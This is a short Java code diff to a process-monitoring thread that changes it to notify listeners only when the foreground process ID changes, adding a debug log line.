@@ -20,6 +20,7 @@ public class BroadcastMonitorProcess extends Thread {
 
 	private boolean stop;
 	private final int period;
+	private int pidFore = 0;
 
 	RunningProcesses runningProcess;
 
@@ -36,15 +37,21 @@ public class BroadcastMonitorProcess extends Thread {
 
 	@Override
 	public void run() {
-		int curCrc;
-
 		do {
 			if (stop) {
 				return;
-			}			
-
+			}		
 			runningProcess.update();
-			listenerProcess.dispatch(runningProcess);
+			int fore = runningProcess.getForegroundPid();
+			
+			if(pidFore!=fore){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (run), fore: " + fore);
+				}
+				pidFore = fore;
+				
+				listenerProcess.dispatch(runningProcess);
+			}
 
 			try {
 				synchronized (this) {
